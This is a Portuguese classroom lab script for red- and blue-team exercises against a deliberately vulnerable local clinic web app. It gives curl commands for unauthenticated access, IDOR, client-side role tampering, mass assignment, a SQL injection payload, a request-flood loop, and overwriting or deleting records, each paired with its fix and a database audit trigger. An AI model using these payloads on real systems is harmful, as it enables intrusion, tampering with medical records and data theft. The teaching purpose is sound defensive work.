# Exercícios — Equipa Vermelha vs. Equipa Azul

Roteiro para a aula. A turma divide-se em:
- **Equipa Vermelha (ataque):** explora as falhas contra o alvo local.
- **Equipa Azul (defesa):** corrige cada falha e volta a testar.

> **Regras do laboratório**
> - Alvo único: a sua instalação local (`localhost:3000` e `localhost:8080`).
> - Proibido usar estas técnicas fora deste laboratório. Testar sistemas reais sem
>   autorização escrita é ilegal. O objetivo é aprender a **defender**.

Ferramentas: o browser (DevTools) e `curl`. Nada mais é preciso.

---

## Parte A — Reconhecimento
1. Abrir DevTools → **Network** e navegar no site. Observar que o browser chama `http://localhost:8080/api/...` diretamente.
2. Abrir DevTools → **Sources** e encontrar `lib/api.js` com a `API_KEY_DEMO`.
   > Lição: tudo o que chega ao cliente é público.

## Exercício 1 — API sem token
```bash
curl http://localhost:8080/api/consultas
```
Devolve todas as consultas sem qualquer autenticação.
> **Defesa:** vulnerabilidade #1. Exigir JWT verificado.

## Exercício 2 — IDOR (histórico alheio)
Na página **O meu histórico**, mudar o campo "ID do paciente" de `1` para `2`.
Ou via API:
```bash
curl http://localhost:8080/api/consultas/paciente/2
```
Aparece a nota clínica do Bruno ("Alergia a penicilina").
> **Defesa:** vulnerabilidade #3.

## Exercício 3 — Entrar na área reservada sem ser admin
1. Login como `ana@exemplo.pt`.
2. DevTools → **Application → Local Storage** → mudar `perfil` para `admin`.
3. Abrir `/admin` e recarregar.
> **Defesa:** vulnerabilidade #4. Autorização tem de ser no servidor.

## Exercício 4 — Senhas guardadas em texto simples (sem encriptação)

**(a) Pela API** — a lista vem com as senhas legíveis, sem autenticação:
```bash
curl http://localhost:8080/api/pacientes
# cada utilizador traz "senha":"ana123", etc.
```

**(b) Na própria base de dados** — a prova de que estão em texto simples.
Compara os dois schemas (o contentor do PostgreSQL chama-se `postgres_db`):
```bash
# VULNERÁVEL (schema public) -> senha LEGÍVEL
docker exec postgres_db psql -U postgres -d clinica \
  -c "SELECT nome, senha FROM public.usuarios;"
#  Ana Costa | ana123

# SEGURO (schema seguro) -> só o HASH BCrypt
docker exec postgres_db psql -U postgres -d clinica \
  -c "SELECT nome, senha FROM seguro.usuarios;"
#  Ana Costa | $2a$10$o9XCQ0e...  (irreversível)
```

> **Impacto:** se a base de dados vazar (backup, SQLi, acesso indevido), todas as
> senhas ficam expostas de imediato — e as pessoas costumam reutilizar senhas
> noutros serviços.
> **Defesa:** vulnerabilidade #5. Guardar apenas o **hash** (BCrypt/Argon2) e nunca
> devolver a senha na API (usar DTO). No modo seguro, o `DataSeeder` grava com
> `encoder.encode(...)` e o login valida com `encoder.matches(...)`.

## Exercício 5 — Criar um admin (Mass Assignment)
```bash
curl -X POST http://localhost:8080/api/pacientes \
  -H "Content-Type: application/json" \
  -d '{"nome":"Intruso","email":"intruso@x.pt","senha":"123","perfil":"admin"}'
```
> **Defesa:** vulnerabilidade #6. Ignorar `perfil` do cliente.

## Exercício 6 — SQL Injection
```bash
curl "http://localhost:8080/api/consultas/buscar?termo=%27%20OR%20%271%27=%271"
```
(`termo = ' OR '1'='1`) devolve todos os registos.
> **Defesa:** vulnerabilidade #7. Query parametrizada.

## Exercício 7 — Disponibilidade: ausência de rate limiting (base de DoS)

> ⚠️ **Teste de carga BENIGNO e limitado, só contra o teu localhost.** Não é uma
> ferramenta de DDoS. O objetivo é **medir** se a API limita pedidos, não derrubar
> nada. Mantém o número de pedidos baixo (ex.: 100). Nunca faças isto a sistemas
> de terceiros.

Enviar 100 pedidos e contar os códigos de resposta:

```bash
# Modo VULNERÁVEL (8080) — nunca limita
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" \
  http://localhost:8080/api/consultas; done | sort | uniq -c
# Esperado: 100x "200"  (aceita tudo)

# Modo SEGURO (8082) — limita por IP
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" \
  http://localhost:8082/api/consultas; done | sort | uniq -c
# Esperado: alguns "401" e, a partir do limite, vários "429"  (bloqueia)
```

(No PowerShell: `1..100 | % { (Invoke-WebRequest -Uri http://localhost:8080/api/consultas -SkipHttpErrorCheck).StatusCode } | Group-Object`.)

> **Lição:** sem rate limiting, uma única origem pode abusar da API (força bruta,
> raspagem, exaustão). A versão segura responde `429 Too Many Requests` acima do
> limite. **Defesa:** vulnerabilidade #12. Um DDoS real (muitas origens) mitiga-se
> também na infraestrutura (CDN/WAF), não só no código.

---

## Parte B — Cenários de corrupção de dados

> Demonstram **integridade** — como dados errados entram no sistema quando não há
> verificação de dono nem validação no servidor.
>
> **Scripts prontos** (correm do diretório raiz do projeto):
> - `bash scripts/demo-corrupcao-dados.sh` — executa o ataque (antes → corrompe → depois)
>   e mostra o mesmo ataque a falhar (401) no backend seguro.
> - `bash scripts/repor-dados.sh` — repõe os dados vulneráveis ao estado inicial.

### Cenário C1 — Reescrever a consulta de outro paciente
```bash
curl -X PUT http://localhost:8080/api/consultas/3 \
  -H "Content-Type: application/json" \
  -d '{"data":"1900-01-01 00:00","procedimento":"CANCELADO","dentista":"-","observacoes":"dados corrompidos","estado":"CANCELADA"}'
```
A consulta do Bruno fica adulterada. Ninguém verificou se quem alterou é o dono.
> **Defesa:** vulnerabilidade #9.

### Cenário C2 — Apagar consultas alheias
```bash
curl -X DELETE http://localhost:8080/api/consultas/1
```
Histórico clínico eliminado sem autorização nem auditoria.

### Cenário C3 — Injetar um registo inconsistente
```bash
curl -X POST http://localhost:8080/api/consultas \
  -H "Content-Type: application/json" \
  -d '{"pacienteId":999,"nomePaciente":"","data":"texto-invalido","procedimento":"","estado":"ESTADO_QUE_NAO_EXISTE"}'
```
Entra um registo órfão (paciente 999 inexistente), com data inválida e estado fora do domínio.
> **Defesa:** validar tipos/domínios no servidor (Bean Validation), chaves estrangeiras, e um `enum` para o estado.

### Cenário C4 — Corrupção em massa via SQL Injection
Partindo do Exercício 6, discutir em grupo como um `termo` malicioso poderia ir além
da leitura. **Mitigação imediata:** query parametrizada + utilizador de base de dados
com privilégios mínimos (sem DDL/UPDATE onde não é preciso).

---

## Parte B2 — Auditoria (detetar a alteração, mesmo vinda de um ataque)

A corrupção acima pode não se conseguir **impedir** no backend vulnerável, mas pode
**ser registada**. A auditoria é feita na BASE DE DADOS (triggers em PostgreSQL),
por isso capta toda a alteração venha de onde vier — a aplicação não a contorna.

- **Onde:** `backend/src/main/resources/db/migration/V3__auditoria.sql`
  (tabela `auditoria` + função `fn_auditoria()` + triggers em `consultas` e `usuarios`).
- Cada INSERT/UPDATE/DELETE grava: operação, tabela, id, utilizador da BD, IP da
  ligação, e o estado **antigo** e **novo** em JSON.

**Demonstração:**
```bash
bash scripts/demo-corrupcao-dados.sh   # executa o ataque
bash scripts/ver-auditoria.sh          # mostra o que ficou registado
```
Resultado típico — o ataque fica gravado com o antes→depois:
```
operacao | tabela    | registo_id | proc_antes | proc_depois | obs_depois
UPDATE   | consultas |          3 | Canal      | CORROMPIDO  | dados adulterados pelo atacante
INSERT   | consultas |          4 |            | NAO_EXISTE  | (registo órfão injetado)
```

> **Lições:**
> - Auditar na BD (não só na app) garante registo mesmo que o atacante contorne a aplicação.
> - A tabela `auditoria` devia ser *append-only* e com acesso restrito; um atacante com SQL
>   total poderia apagá-la, por isso em produção usa-se também envio para um destino externo
>   (SIEM/log central) que o atacante não controla.
> - Detetar não substitui prevenir: combina auditoria com as correções da Parte C.

---

## Parte C — Equipa Azul (corrigir e validar)

Para cada falha acima:
1. Aplicar a correção indicada em `LAB-VULNERABILIDADES.md`.
2. Repetir o exercício de ataque e confirmar que agora devolve `401/403` ou falha.
3. Registar no quadro: falha → correção → prova de que ficou fechada.

**Checklist de defesa:**
- [ ] #1 JWT exigido em todos os endpoints
- [ ] #2 Chamadas sensíveis no servidor; segredos fora do cliente
- [ ] #3 Dono derivado do token (sem IDOR)
- [ ] #4 Autorização por papel no servidor
- [ ] #5 Senhas com hash; DTO sem senha
- [ ] #6 `perfil` ignorado no registo
- [ ] #7 Queries parametrizadas
- [ ] #8 CORS restrito às origens conhecidas
- [ ] #9 Verificação de dono em PUT/DELETE + auditoria
- [ ] #10 Consola H2 desligada
- [ ] #11 Token assinado; erros genéricos
- [ ] #12 Rate limiting por IP (429 acima do limite)
